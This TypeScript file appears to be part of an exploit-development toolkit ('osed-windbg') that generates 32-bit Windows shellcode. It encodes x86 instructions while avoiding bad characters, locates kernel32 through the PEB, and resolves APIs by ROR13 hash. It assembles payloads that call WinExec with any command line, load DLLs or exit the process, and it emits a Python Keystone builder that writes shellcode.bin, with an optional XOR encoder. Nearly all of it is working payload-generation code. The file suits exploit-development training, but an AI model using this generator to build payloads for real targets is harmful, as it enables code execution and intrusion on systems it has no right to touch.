import { ror13Hash } from "./index";
import { SC_BUILDER_SOURCE } from "./sc_builder_source";

export type Reg = "eax" | "ecx" | "edx" | "ebx" | "esp" | "ebp" | "esi" | "edi";
const REGS: Reg[] = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"];
const SCRATCH: Reg[] = ["eax", "ecx", "edx"];

/** One instruction. `bytes` is its exact x86 encoding, or undefined when an operand is a placeholder. */
export type AsmLine = { asm: string; bytes?: number[]; note?: string };
export type BadSet = ReadonlySet<number>;

export type Outcome<T> = ({ ok: true } & T) | { ok: false; error: string };

const regIndex = (reg: Reg): number => REGS.indexOf(reg);
const isReg = (value: string): value is Reg => (REGS as string[]).includes(value);
const hex = (value: number): string => `0x${(value >>> 0).toString(16)}`;
const hex32 = (value: number): string => `0x${(value >>> 0).toString(16).padStart(8, "0")}`;
const fitsImm8 = (value: number): boolean => (value | 0) >= -128 && (value | 0) <= 127;

function le32(value: number): number[] {
  const v = value >>> 0;
  return [v & 0xff, (v >>> 8) & 0xff, (v >>> 16) & 0xff, (v >>> 24) & 0xff];
}

function frameOperand(disp: number): string {
  return `dword ptr [ebp${disp < 0 ? "-" : "+"}0x${Math.abs(disp).toString(16).padStart(2, "0")}]`;
}

const ALU_EXT = { add: 0, sub: 5, xor: 6 } as const;

/** Encoder for the instruction subset the generators emit; Keystone picks the same forms. */
export const x86 = {
  pushImm: (value: number): AsmLine => ({
    asm: `push ${hex(value)}`,
    bytes: fitsImm8(value) ? [0x6a, value & 0xff] : [0x68, ...le32(value)],
  }),
  pushReg: (reg: Reg): AsmLine => ({ asm: `push ${reg}`, bytes: [0x50 + regIndex(reg)] }),
  popReg: (reg: Reg): AsmLine => ({ asm: `pop ${reg}`, bytes: [0x58 + regIndex(reg)] }),
  movImm: (reg: Reg, value: number): AsmLine => ({ asm: `mov ${reg}, ${hex(value)}`, bytes: [0xb8 + regIndex(reg), ...le32(value)] }),
  movReg: (dst: Reg, src: Reg): AsmLine => ({ asm: `mov ${dst}, ${src}`, bytes: [0x89, 0xc0 | (regIndex(src) << 3) | regIndex(dst)] }),
  zero: (op: "xor" | "sub", reg: Reg): AsmLine => ({
    asm: `${op} ${reg}, ${reg}`,
    bytes: [op === "xor" ? 0x31 : 0x29, 0xc0 | (regIndex(reg) << 3) | regIndex(reg)],
  }),
  not: (reg: Reg): AsmLine => ({ asm: `not ${reg}`, bytes: [0xf7, 0xd0 + regIndex(reg)] }),
  neg: (reg: Reg): AsmLine => ({ asm: `neg ${reg}`, bytes: [0xf7, 0xd8 + regIndex(reg)] }),
  alu: (op: keyof typeof ALU_EXT, reg: Reg, value: number): AsmLine => {
    const ext = ALU_EXT[op] << 3;
    const bytes = fitsImm8(value) ? [0x83, 0xc0 | ext | regIndex(reg), value & 0xff]
      : reg === "eax" ? [0x05 | ext, ...le32(value)]
      : [0x81, 0xc0 | ext | regIndex(reg), ...le32(value)];
    return { asm: `${op} ${reg}, ${hex(value)}`, bytes };
  },
  pushFrame: (disp: number): AsmLine => ({ asm: `push ${frameOperand(disp)}`, bytes: [0xff, 0x75, disp & 0xff] }),
  callFrame: (disp: number): AsmLine => ({ asm: `call ${frameOperand(disp)}`, bytes: [0xff, 0x55, disp & 0xff] }),
  storeFrame: (disp: number, reg: Reg): AsmLine => ({ asm: `mov ${frameOperand(disp)}, ${reg}`, bytes: [0x89, 0x45 | (regIndex(reg) << 3), disp & 0xff] }),
  callReg: (reg: Reg): AsmLine => ({ asm: `call ${reg}`, bytes: [0xff, 0xd0 + regIndex(reg)] }),
};

/** Stack slots below ebp that sc.template reserves and sc.call_frame relies on. */
export const SLOT = { resolver: -0x04, kernel32: -0x08, module: -0x0c, proc: -0x10 } as const;

export function isClean(lines: AsmLine[], bad: BadSet): boolean {
  return lines.every((line) => line.bytes !== undefined && line.bytes.every((byte) => !bad.has(byte)));
}

const withNote = (lines: AsmLine[], note: string): AsmLine[] =>
  lines.map((line, i) => (i === lines.length - 1 ? { ...line, note } : line));

function xorKey(value: number, bad: BadSet): number | undefined {
  let key = 0;
  for (let shift = 0; shift < 32; shift += 8) {
    const byte = (value >>> shift) & 0xff;
    let k = 1;
    while (k <= 0xff && (bad.has(k) || bad.has(byte ^ k))) k += 1;
    if (k > 0xff) return undefined;
    key |= k << shift;
  }
  return key >>> 0;
}

function registerPlans(value: number, reg: Reg, bad: BadSet): AsmLine[][] {
  const plans = [
    [x86.movImm(reg, ~value), x86.not(reg), x86.pushReg(reg)],
    [x86.movImm(reg, -value), x86.neg(reg), x86.pushReg(reg)],
  ];
  const key = xorKey(value, bad);
  if (key !== undefined) plans.push([x86.movImm(reg, value ^ key), x86.alu("xor", reg, key), x86.pushReg(reg)]);
  for (let k = 1; k <= 0xff; k += 1) {
    const addend = (k * 0x01010101) >>> 0;
    plans.push([x86.movImm(reg, value - addend), x86.alu("add", reg, addend), x86.pushReg(reg)]);
  }
  return plans;
}

/**
 * Shortest listed way to push `value` with no byte from `bad` in any encoding:
 * push imm, then mov/not, mov/neg, mov/xor and mov/add through a scratch register.
 */
export function pushValue(value: number, bad: BadSet, scratch: Reg[] = SCRATCH): AsmLine[] | undefined {
  const v = value >>> 0;
  if (v === 0) {
    return scratch.flatMap((reg) => [[x86.zero("xor", reg), x86.pushReg(reg)], [x86.zero("sub", reg), x86.pushReg(reg)]])
      .find((plan) => isClean(plan, bad));
  }
  const direct = [x86.pushImm(v)];
  if (isClean(direct, bad)) return direct;
  for (const reg of scratch) {
    const plan = registerPlans(v, reg, bad).find((candidate) => isClean(candidate, bad));
    if (plan) return plan;
  }
  return undefined;
}

export function describeBytes(bytes: number[]): string {
  return `"${bytes.map((byte) => byte === 0 ? "\\0"
    : byte >= 0x20 && byte <= 0x7e ? String.fromCharCode(byte)
    : `\\x${byte.toString(16).padStart(2, "0")}`).join("")}"`;
}

export function pushString(text: string, bad: BadSet, register?: Reg): Outcome<{ lines: AsmLine[] }> {
  if (text.length === 0) return { ok: false, error: "Text is empty." };
  const codes = [...text].map((char) => char.charCodeAt(0));
  if (codes.some((code) => code < 1 || code > 0xff)) return { ok: false, error: "Text must be single-byte characters without NUL." };
  if (register === "esp") return { ok: false, error: "ESP already points at the string; pick another register." };

  const padded = [...codes, 0];
  while (padded.length % 4 !== 0) padded.push(0);
  const lines: AsmLine[] = [];
  for (let offset = padded.length - 4; offset >= 0; offset -= 4) {
    const chunk = padded.slice(offset, offset + 4);
    const value = (chunk[0] | (chunk[1] << 8) | (chunk[2] << 16) | (chunk[3] << 24)) >>> 0;
    const plan = pushValue(value, bad);
    if (!plan) return { ok: false, error: `No encoding of dword ${hex32(value)} (${describeBytes(chunk)}) avoids the bad characters.` };
    lines.push(...withNote(plan, describeBytes(chunk)));
  }
  if (register) {
    const pointer = [[x86.movReg(register, "esp")], [x86.pushReg("esp"), x86.popReg(register)]].find((plan) => isClean(plan, bad));
    if (!pointer) return { ok: false, error: `No way to copy ESP into ${register} avoids the bad characters.` };
    lines.push(...withNote(pointer, `${register} -> ${describeBytes(codes)}`));
  }
  return { ok: true, lines };
}

type ApiPrototype = { name: string; module: string; params: string[] };

const API_PROTOTYPES: ApiPrototype[] = [
  { name: "WinExec", module: "kernel32.dll", params: ["lpCmdLine", "uCmdShow"] },
  { name: "ExitProcess", module: "kernel32.dll", params: ["uExitCode"] },
  { name: "TerminateProcess", module: "kernel32.dll", params: ["hProcess", "uExitCode"] },
  { name: "ExitThread", module: "kernel32.dll", params: ["dwExitCode"] },
  { name: "LoadLibraryA", module: "kernel32.dll", params: ["lpLibFileName"] },
  { name: "GetProcAddress", module: "kernel32.dll", params: ["hModule", "lpProcName"] },
  { name: "VirtualAlloc", module: "kernel32.dll", params: ["lpAddress", "dwSize", "flAllocationType", "flProtect"] },
  { name: "VirtualProtect", module: "kernel32.dll", params: ["lpAddress", "dwSize", "flNewProtect", "lpflOldProtect"] },
  { name: "CreateProcessA", module: "kernel32.dll", params: ["lpApplicationName", "lpCommandLine", "lpProcessAttributes", "lpThreadAttributes", "bInheritHandles", "dwCreationFlags", "lpEnvironment", "lpCurrentDirectory", "lpStartupInfo", "lpProcessInformation"] },
  { name: "WaitForSingleObject", module: "kernel32.dll", params: ["hHandle", "dwMilliseconds"] },
  { name: "WSAStartup", module: "ws2_32.dll", params: ["wVersionRequested", "lpWSAData"] },
  { name: "WSASocketA", module: "ws2_32.dll", params: ["af", "type", "protocol", "lpProtocolInfo", "g", "dwFlags"] },
  { name: "connect", module: "ws2_32.dll", params: ["s", "name", "namelen"] },
  { name: "MessageBoxA", module: "user32.dll", params: ["hWnd", "lpText", "lpCaption", "uType"] },
];

type CallArg =
  | { kind: "number"; value: number }
  | { kind: "register"; reg: Reg }
  | { kind: "frame"; disp: number }
  | { kind: "expr"; text: string };

function parseCallArg(raw: string): CallArg {
  const text = raw.trim();
  if (/^-?(0x[0-9a-f]+|\d+)$/i.test(text)) {
    const negative = text.startsWith("-");
    const magnitude = Number(negative ? text.slice(1) : text);
    if (magnitude <= 0xffffffff) return { kind: "number", value: (negative ? -magnitude : magnitude) >>> 0 };
  }
  const lower = text.toLowerCase();
  if (isReg(lower)) return { kind: "register", reg: lower };
  const frame = /^(?:dword\s+ptr\s*)?\[\s*ebp\s*([+-])\s*(0x[0-9a-f]+|\d+)\s*\]$/i.exec(text);
  if (frame) {
    const disp = (frame[1] === "-" ? -1 : 1) * Number(frame[2]);
    if (disp >= -0x80 && disp <= 0x7f) return { kind: "frame", disp };
  }
  return { kind: "expr", text };
}

function mentionedRegisters(arg: CallArg): Reg[] {
  if (arg.kind === "register") return [arg.reg];
  if (arg.kind === "expr") return REGS.filter((reg) => new RegExp(`\\b${reg}\\b`, "i").test(arg.text));
  return arg.kind === "frame" ? ["ebp"] : [];
}

export type CallFrameResult = { api: string; module: string; hash: number; known: boolean; title: string; lines: AsmLine[]; warnings: string[] };

export function callFrame(api: string, rawArgs: string[], bad: BadSet): Outcome<CallFrameResult> {
  const typed = api.trim();
  if (!/^[A-Za-z_][A-Za-z0-9_]*$/.test(typed)) return { ok: false, error: "API name must be an export name such as WinExec." };
  const prototype = API_PROTOTYPES.find((entry) => entry.name.toLowerCase() === typed.toLowerCase());
  const name = prototype?.name ?? typed;
  const module = prototype?.module ?? "kernel32.dll";
  const warnings: string[] = [];
  if (!prototype) {
    warnings.push(`"${typed}" is not in the prototype table: the hash uses the name exactly as typed (exports are case-sensitive), the module is assumed to be kernel32.dll, and arguments are only numbered.`);
  } else {
    if (prototype.name !== typed) warnings.push(`Using the export spelling "${prototype.name}"; the hash is case-sensitive.`);
    if (prototype.params.length !== rawArgs.length) warnings.push(`${prototype.name} takes ${prototype.params.length} argument(s); ${rawArgs.length} given.`);
  }

  const args = rawArgs.map(parseCallArg);
  const scratch = SCRATCH.filter((reg) => !args.some((arg) => mentionedRegisters(arg).includes(reg)));
  const lines: AsmLine[] = [];
  for (let i = args.length - 1; i >= 0; i -= 1) {
    const arg = args[i];
    const label = `arg${i + 1} ${prototype?.params[i] ?? "?"} = ${rawArgs[i].trim()}`;
    if (arg.kind === "number") {
      const plan = pushValue(arg.value, bad, scratch);
      if (!plan) return { ok: false, error: `No encoding of ${label} avoids the bad characters.` };
      lines.push(...withNote(plan, label));
    } else if (arg.kind === "register") {
      lines.push({ ...x86.pushReg(arg.reg), note: label });
    } else if (arg.kind === "frame") {
      lines.push({ ...x86.pushFrame(arg.disp), note: label });
    } else {
      const operand = arg.text.includes("[") && !/\bptr\b/i.test(arg.text) ? `dword ptr ${arg.text}` : arg.text;
      lines.push({ asm: `push ${operand}`, note: `${label}${arg.text.includes("<") ? " (placeholder)" : ""}` });
    }
  }

  const hash = ror13Hash(name);
  const hashPlan = pushValue(hash, bad, scratch);
  if (!hashPlan) return { ok: false, error: `No encoding of hash ${hex32(hash)} avoids the bad characters.` };
  lines.push(...withNote(hashPlan, `ROR13("${name}") = ${hex32(hash)}`));
  const kernel32 = module === "kernel32.dll";
  lines.push(
    { ...x86.pushFrame(kernel32 ? SLOT.kernel32 : SLOT.module), note: kernel32 ? "kernel32 base" : `${module} base saved after LoadLibraryA` },
    { ...x86.callFrame(SLOT.resolver), note: `resolver: eax = ${name}` },
    { ...x86.callReg("eax"), note: `${name} pops its ${args.length} argument(s)` },
  );
  for (const line of lines) {
    const hits = (line.bytes ?? []).filter((byte) => bad.has(byte));
    if (hits.length > 0) warnings.push(`"${line.asm}" holds bad byte(s) ${hexBytes(hits)}; rewrite that line by hand.`);
  }
  const params = prototype ? prototype.params.join(", ") : args.map((_, i) => `arg${i + 1}`).join(", ");
  return { ok: true, api: name, module, hash, known: !!prototype, title: `${name}(${params}) in ${module}, ROR13 ${hex32(hash)}`, lines, warnings };
}

export function parseBadchars(value: unknown): number[] | undefined {
  if (value === undefined || value === null || value === "") return [0];
  if (Array.isArray(value)) {
    const bytes = value.map(Number);
    return bytes.every((byte) => Number.isInteger(byte) && byte >= 0 && byte <= 0xff) ? [...new Set([0, ...bytes])].sort((a, b) => a - b) : undefined;
  }
  const text = String(value).trim();
  const tokens = text.split(/[\s,]+|(?=\\x)/i).filter(Boolean);
  const bytes: number[] = [];
  for (const token of tokens) {
    const pair = /^(?:\\x|0x)?([0-9a-f]{2})$/i.exec(token);
    if (pair) {
      bytes.push(parseInt(pair[1], 16));
      continue;
    }
    if (/^[0-9a-f]+$/i.test(token) && token.length % 2 === 0) {
      for (let i = 0; i < token.length; i += 2) bytes.push(parseInt(token.slice(i, i + 2), 16));
      continue;
    }
    return undefined;
  }
  return [...new Set([0, ...bytes])].sort((a, b) => a - b);
}

export function hexBytes(bytes: number[]): string {
  return bytes.map((byte) => byte.toString(16).toUpperCase().padStart(2, "0")).join(" ");
}

export function renderAsm(lines: AsmLine[]): string[] {
  const asmWidth = Math.max(...lines.map((line) => line.asm.length));
  const byteWidth = Math.max(...lines.map((line) => (line.bytes ? hexBytes(line.bytes) : "??").length));
  return lines.map((line) => {
    const bytes = (line.bytes ? hexBytes(line.bytes) : "??").padEnd(byteWidth);
    return `${line.asm.padEnd(asmWidth)}  ; ${bytes}${line.note ? `  ${line.note}` : ""}`.trimEnd();
  });
}

const pyString = (text: string): string => `"${text.replace(/\\/g, "\\\\").replace(/"/g, '\\"')}"`;

/** The same lines as a Python string that Keystone assembles (instructions split by ';'). */
export function renderKeystoneCode(lines: AsmLine[], name = "CODE"): string[] {
  const width = Math.max(...lines.map((line) => pyString(`${line.asm};`).length));
  return [
    `${name} = (`,
    ...lines.map((line) => `    ${pyString(`${line.asm};`).padEnd(width)}${line.note ? `  # ${line.note}` : ""}`.trimEnd()),
    ")",
  ];
}

export type TemplateTask =
  | { kind: "winexec"; command: string; show: number }
  | { kind: "loadlibrary"; dll: string }
  | { kind: "getprocaddress"; name: string }
  | { kind: "exitprocess" }
  | { kind: "terminateprocess" };

export type TemplatePlan = { tasks: TemplateTask[]; badchars: number[] };

export const TEMPLATE_TASK_HELP = 'winexec=<command line>, loadlibrary=<dll>, getprocaddress=<export>, exit, terminate, show=<uCmdShow for later winexec tasks>, bad=<bad chars>';

export function parseTemplateArgs(tokens: string[]): Outcome<TemplatePlan> {
  const tasks: TemplateTask[] = [];
  let badchars: number[] = [0];
  let show = 1;
  for (const raw of tokens) {
    const token = raw.trim();
    const eq = token.indexOf("=");
    const key = (eq < 0 ? token : token.slice(0, eq)).trim().toLowerCase();
    const value = eq < 0 ? "" : token.slice(eq + 1);
    if (key === "bad" || key === "badchars") {
      const parsed = parseBadchars(value);
      if (!parsed) return { ok: false, error: `Cannot read the bad characters "${value}".` };
      badchars = parsed;
    } else if (key === "show") {
      if (!/^\d+$/.test(value.trim())) return { ok: false, error: `show takes a number such as 0 (SW_HIDE) or 1 (SW_SHOWNORMAL), not "${value}".` };
      show = Number(value.trim());
    } else if (key === "winexec" && value) {
      tasks.push({ kind: "winexec", command: value, show });
    } else if (key === "loadlibrary" && value) {
      tasks.push({ kind: "loadlibrary", dll: value.trim() });
    } else if (key === "getprocaddress" && value) {
      tasks.push({ kind: "getprocaddress", name: value.trim() });
    } else if (key === "exit" || key === "exitprocess") {
      tasks.push({ kind: "exitprocess" });
    } else if (key === "terminate" || key === "terminateprocess") {
      tasks.push({ kind: "terminateprocess" });
    } else {
      return { ok: false, error: `Unknown task "${token}". Tasks: ${TEMPLATE_TASK_HELP}.` };
    }
  }
  if (tasks.length === 0) tasks.push({ kind: "winexec", command: "calc.exe", show }, { kind: "exitprocess" });
  return { ok: true, tasks, badchars };
}

type ScriptLine = { label: string } | { comment: string } | AsmLine;

const op = (asm: string, note?: string): AsmLine => ({ asm, note });

const PROLOGUE: ScriptLine[] = [
  { comment: "Entry: save the caller's registers, open a frame, and move esp 0x7f0 bytes down." },
  { comment: "Slots below ebp: -0x04 resolver, -0x08 kernel32 base, -0x0c LoadLibraryA result, -0x10 GetProcAddress result." },
  op("pushad"),
  op("mov ebp, esp"),
  op("add esp, 0xfffff810", "esp = ebp - 0x7f0; a sub of 0x7f0 would hold 00 bytes"),
];

const FIND_KERNEL32: ScriptLine[] = [
  { comment: "kernel32 base: TEB -> PEB -> loader data -> modules in initialization order." },
  op("xor ecx, ecx"),
  op("mov eax, dword ptr fs:[ecx+0x30]", "PEB; a register base keeps 00 bytes out of the address"),
  op("mov eax, dword ptr [eax+0x0c]", "PEB_LDR_DATA"),
  op("mov esi, dword ptr [eax+0x1c]", "first InInitializationOrderModuleList link"),
  { label: "k32_next" },
  op("mov ebx, dword ptr [esi+0x08]", "DllBase of this entry"),
  op("lea edi, [esi+0x1c]", "edi -> BaseDllName"),
  op("mov esi, dword ptr [esi]", "advance now, the checks below use ebx and edi"),
  op("cmp word ptr [edi], 0x18", "Length 0x18 = 12 UTF-16 chars, as in kernel32.dll"),
  op("jne k32_next"),
  op("mov edi, dword ptr [edi+0x04]", "BaseDllName.Buffer"),
  op("mov al, byte ptr [edi]"),
  op("and al, 0xdf", "upper case"),
  op("cmp al, 0x4b", "'K' rules out other 12-char names"),
  op("jne k32_next"),
  op(`mov ${frameOperand(SLOT.kernel32)}, ebx`, "kernel32 base"),
  op(`mov ${frameOperand(SLOT.module)}, ebx`, "module slot starts as kernel32 until a LoadLibraryA task runs"),
];

const RESOLVER: ScriptLine[] = [
  { comment: "Store the resolver address: a backward call pushes it without 00 bytes in the rel32." },
  op("jmp res_call"),
  { label: "res_pop" },
  op("pop esi", "esi = resolve_hash"),
  op(`mov ${frameOperand(SLOT.resolver)}, esi`, "resolver"),
  op("jmp main"),
  { label: "res_call" },
  op("call res_pop"),
  { comment: "resolve_hash(module_base, hash) -> eax = export address, 0 when no name matches." },
  { comment: "Call it as: push hash; push module_base; call [ebp-0x04]. It pops both arguments and keeps every register but eax." },
  { label: "resolve_hash" },
  op("push ebx"),
  op("push ecx"),
  op("push edx"),
  op("push esi"),
  op("push edi"),
  op("mov ebx, dword ptr [esp+0x18]", "module base (5 saved registers + return address above it)"),
  op("mov eax, dword ptr [ebx+0x3c]", "e_lfanew"),
  op("mov edi, dword ptr [ebx+eax+0x78]", "export directory RVA"),
  op("lea edi, [ebx+edi+0x18]", "edi -> NumberOfNames; the next three fields follow at +4, +8, +0xc"),
  op("mov ecx, dword ptr [edi]", "NumberOfNames, walked from the last name down"),
  { label: "rh_scan" },
  op("jecxz rh_none"),
  op("dec ecx"),
  op("mov esi, dword ptr [edi+0x08]", "AddressOfNames"),
  op("add esi, ebx"),
  op("mov esi, dword ptr [esi+ecx*4]", "name RVA"),
  op("add esi, ebx"),
  op("xor edx, edx", "running hash"),
  op("xor eax, eax"),
  { label: "rh_char" },
  op("lodsb"),
  op("test al, al"),
  op("jz rh_hashed"),
  op("rol edx, 0x13", "same as ror 13; the 0x0d count byte is a common bad char"),
  op("add edx, eax"),
  op("jmp rh_char"),
  { label: "rh_hashed" },
  op("cmp edx, dword ptr [esp+0x1c]", "wanted hash"),
  op("jne rh_scan"),
  op("mov esi, dword ptr [edi+0x0c]", "AddressOfNameOrdinals"),
  op("add esi, ebx"),
  op("movzx ecx, word ptr [esi+ecx*2]", "name index -> function index"),
  op("mov esi, dword ptr [edi+0x04]", "AddressOfFunctions"),
  op("add esi, ebx"),
  op("mov eax, dword ptr [esi+ecx*4]", "function RVA"),
  op("add eax, ebx", "function VA"),
  op("jmp rh_out"),
  { label: "rh_none" },
  op("xor eax, eax"),
  { label: "rh_out" },
  op("mov edx, dword ptr [esp+0x14]", "return address"),
  op("mov dword ptr [esp+0x1c], edx", "over the hash slot, so one add drops both arguments"),
  op("pop edi"),
  op("pop esi"),
  op("pop edx"),
  op("pop ecx"),
  op("pop ebx"),
  op("add esp, 0x08", "ret 8 would encode a 00 byte"),
  op("ret"),
  { label: "main" },
];

const EPILOGUE: ScriptLine[] = [
  { comment: "Exit: restore the caller's stack and registers and return to it." },
  op("mov esp, ebp"),
  op("popad"),
  op("ret"),
];

function taskLines(task: TemplateTask, bad: BadSet, index: number): Outcome<{ lines: ScriptLine[] }> {
  const frame = (api: string, args: string[], after: AsmLine[] = []): Outcome<{ lines: ScriptLine[] }> => {
    const call = callFrame(api, args, bad);
    return call.ok ? { ok: true, lines: [...call.lines, ...after] } : call;
  };
  const withString = (text: string, then: Outcome<{ lines: ScriptLine[] }>): Outcome<{ lines: ScriptLine[] }> => {
    const pushed = pushString(text, bad, "ebx");
    if (!pushed.ok) return pushed;
    return then.ok ? { ok: true, lines: [...pushed.lines, ...then.lines] } : then;
  };
  const header = (text: string, body: Outcome<{ lines: ScriptLine[] }>): Outcome<{ lines: ScriptLine[] }> =>
    body.ok ? { ok: true, lines: [{ comment: `Task ${index}: ${text}` }, ...body.lines] } : body;

  switch (task.kind) {
    case "winexec":
      return header(`WinExec(${describeBytes([...task.command].map((c) => c.charCodeAt(0)))}, ${task.show})`,
        withString(task.command, frame("WinExec", ["ebx", String(task.show)])));
    case "loadlibrary":
      return header(`LoadLibraryA("${task.dll}"), base saved at [ebp-0x0c]`,
        withString(task.dll, frame("LoadLibraryA", ["ebx"], [{ ...x86.storeFrame(SLOT.module, "eax"), note: `${task.dll} base` }])));
    case "getprocaddress":
      return header(`GetProcAddress(last LoadLibraryA base or kernel32, "${task.name}"), address saved at [ebp-0x10]`,
        withString(task.name, frame("GetProcAddress", [frameOperand(SLOT.module), "ebx"], [{ ...x86.storeFrame(SLOT.proc, "eax"), note: `${task.name}: push its arguments, then call dword ptr [ebp-0x10]` }])));
    case "exitprocess":
      return header("ExitProcess(0)", frame("ExitProcess", ["0"]));
    case "terminateprocess":
      return header("TerminateProcess(current process, 0)", frame("TerminateProcess", ["-1", "0"]));
  }
}

function pythonAsmEntries(lines: ScriptLine[]): string[] {
  const entries = lines.map((line) => ("comment" in line ? { text: "", note: line.comment, comment: true }
    : "label" in line ? { text: `${pyString(`${line.label}:`)},`, note: "", comment: false }
    : { text: `${pyString(line.asm)},`, note: line.note ?? "", comment: false }));
  const width = Math.max(...entries.filter((entry) => !entry.comment).map((entry) => entry.text.length));
  return entries.map((entry) => entry.comment ? `    # ${entry.note}`
    : `    ${entry.text.padEnd(width)}${entry.note ? `  # ${entry.note}` : ""}`.trimEnd());
}

const SCRIPT_TAIL = String.raw`
LABEL = re.compile(r"^([A-Za-z_][A-Za-z0-9_]*):$")
LABEL_NAMES = {m.group(1) for m in map(LABEL.match, ASM) if m}


def place_lines(ks):
    """Assemble each instruction alone at its final offset, so every byte maps back to its line."""
    labels = {}
    for _ in range(16):
        placed, seen, offset = [], {}, 0
        for line in ASM:
            match = LABEL.match(line)
            if match:
                seen[match.group(1)] = offset
                continue
            text = re.sub(r"\b[A-Za-z_][A-Za-z0-9_]*\b",
                          lambda m: hex(labels.get(m.group(0), offset)) if m.group(0) in LABEL_NAMES else m.group(0),
                          line)
            try:
                encoding, _ = ks.asm(text, offset)
            except Exception as error:
                sys.exit(f"[-] cannot assemble {line!r}: {error}")
            encoding = bytes(encoding or b"")
            placed.append((offset, line, encoding))
            offset += len(encoding)
        if seen == labels:
            return placed
        labels = seen
    sys.exit("[-] label offsets did not settle")


def main():
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    whole, _ = ks.asm("\n".join(ASM), 0)
    code = bytes(whole)
    placed = place_lines(ks)
    if b"".join(encoding for _, _, encoding in placed) != code:
        print("[!] the per-line map differs from the whole assembly; treat offsets as approximate")
    print(f"[+] {len(code)} bytes")
    bad = [(offset + i, byte, line) for offset, line, encoding in placed
           for i, byte in enumerate(encoding) if byte in BADCHARS]
    for offset, byte, line in bad:
        print(f"[-] bad byte 0x{byte:02x} at offset 0x{offset:04x} in: {line}")
    print(f"[+] {len(bad)} bad bytes against {' '.join(f'{b:02x}' for b in BADCHARS)}")
    with open("shellcode.bin", "wb") as handle:
        handle.write(code)
    print("[+] wrote shellcode.bin")
    print('shellcode = b""')
    for start in range(0, len(code), 16):
        print('shellcode += b"' + "".join(f"\\x{byte:02x}" for byte in code[start:start + 16]) + '"')
    return 1 if bad else 0


if __name__ == "__main__":
    sys.exit(main())
`;

export type TemplateResult = { script: string[]; asm: ScriptLine[] };

export function buildTemplate(plan: TemplatePlan, invocation: string): Outcome<TemplateResult> {
  const bad = new Set(plan.badchars);
  const body: ScriptLine[] = [];
  for (const [i, task] of plan.tasks.entries()) {
    const lines = taskLines(task, bad, i + 1);
    if (!lines.ok) return lines;
    body.push(...lines.lines);
  }
  const exits = plan.tasks.some((task) => task.kind === "exitprocess" || task.kind === "terminateprocess");
  const epilogue = exits ? [{ comment: "Not reached after the exit call; it returns to the caller if you delete that task." }, ...EPILOGUE] : EPILOGUE;
  const asm = [...PROLOGUE, ...FIND_KERNEL32, ...RESOLVER, ...body, ...epilogue];
  const script = [
    "#!/usr/bin/env python3",
    `# build_sc.py from osed-windbg ${invocation}`,
    "# Needs Python 3 and keystone-engine (pip install keystone-engine).",
    "# Prints the size and every bad byte with its offset and line, writes shellcode.bin,",
    "# and prints the bytes as a Python literal. Exit code 1 means a bad byte is present.",
    "import re",
    "import sys",
    "",
    "from keystone import Ks, KS_ARCH_X86, KS_MODE_32",
    "",
    `BADCHARS = bytes([${plan.badchars.map((byte) => `0x${byte.toString(16).padStart(2, "0")}`).join(", ")}])`,
    "",
    "ASM = [",
    ...pythonAsmEntries(asm),
    "]",
    ...SCRIPT_TAIL.split("\n"),
  ];
  return { ok: true, script, asm };
}

export type BuilderPlan = TemplatePlan & { xor: boolean; maxSize?: number };

export function parseBuilderArgs(tokens: string[]): Outcome<BuilderPlan> {
  let xor = false;
  let maxSize: number | undefined;
  const rest: string[] = [];
  for (const raw of tokens) {
    const token = raw.trim().toLowerCase();
    if (token === "xor") {
      xor = true;
    } else if (token.startsWith("max=")) {
      const value = Number(token.slice(4).trim());
      if (!Number.isInteger(value) || value <= 0) return { ok: false, error: `max takes a byte count such as 400 or 0x200, not "${raw.trim().slice(4)}".` };
      maxSize = value;
    } else {
      rest.push(raw);
    }
  }
  const plan = parseTemplateArgs(rest);
  if (!plan.ok) return { ok: false, error: plan.error.replace(/\.$/, ", xor, max=<bytes>.") };
  return { ...plan, xor, maxSize };
}

const pyText = (text: string): string => `"${[...text].map((char) => {
  const code = char.charCodeAt(0);
  if (char === "\\" || char === '"') return `\\${char}`;
  if (code >= 0x20 && code <= 0x7e) return char;
  return code <= 0xff ? `\\x${code.toString(16).padStart(2, "0")}` : `\\u${code.toString(16).padStart(4, "0")}`;
}).join("")}"`;

/** The CONFIG block of sc_builder.py for the sc.template task grammar. */
export function builderConfig(plan: BuilderPlan): string[] {
  const calls: string[] = [];
  let lastLoad: number | undefined;
  let exit = "ret";
  for (const task of plan.tasks) {
    if (task.kind === "winexec") {
      calls.push(`("kernel32.dll", "WinExec", [s(${pyText(task.command)}), ${task.show}]),`);
    } else if (task.kind === "loadlibrary") {
      calls.push(`("kernel32.dll", "LoadLibraryA", [s(${pyText(task.dll)})]),`);
      lastLoad = calls.length;
    } else if (task.kind === "getprocaddress") {
      calls.push(`("kernel32.dll", "GetProcAddress", [${lastLoad ? `ref(${lastLoad})` : 'base("kernel32.dll")'}, s(${pyText(task.name)})]),`);
    } else {
      exit = task.kind === "exitprocess" ? "exit" : "terminate";
    }
  }
  const direct = plan.tasks.some((task) => task.kind === "loadlibrary" || task.kind === "getprocaddress")
    ? ['    # The builder loads DLLs and resolves exports itself: ("user32.dll", "MessageBoxA", [0, s("text"), s("caption"), 0]) needs neither call.']
    : [];
  return [
    `BADCHARS = b"${plan.badchars.map((byte) => `\\x${byte.toString(16).padStart(2, "0")}`).join("")}"`,
    `MAX_SIZE = ${plan.maxSize ?? "None"}`,
    "CALLS = [",
    ...direct,
    ...calls.map((call) => `    ${call}`),
    "]",
    `EXIT = "${exit}"`,
    `XOR_ENCODER = ${plan.xor ? "True" : "False"}`,
  ];
}

const CONFIG_START = "# >>> CONFIG\n";
const CONFIG_END = "# <<< CONFIG\n";

/** sc_builder.py as shipped, or with its CONFIG block filled from sc.template-style tasks. */
export function builderScript(tokens: string[]): Outcome<{ script: string; plan?: BuilderPlan }> {
  if (tokens.length === 0) return { ok: true, script: SC_BUILDER_SOURCE };
  const plan = parseBuilderArgs(tokens);
  if (!plan.ok) return plan;
  const start = SC_BUILDER_SOURCE.indexOf(CONFIG_START) + CONFIG_START.length;
  const end = SC_BUILDER_SOURCE.indexOf(CONFIG_END);
  return { ok: true, plan, script: `${SC_BUILDER_SOURCE.slice(0, start)}${builderConfig(plan).join("\n")}\n${SC_BUILDER_SOURCE.slice(end)}` };
}
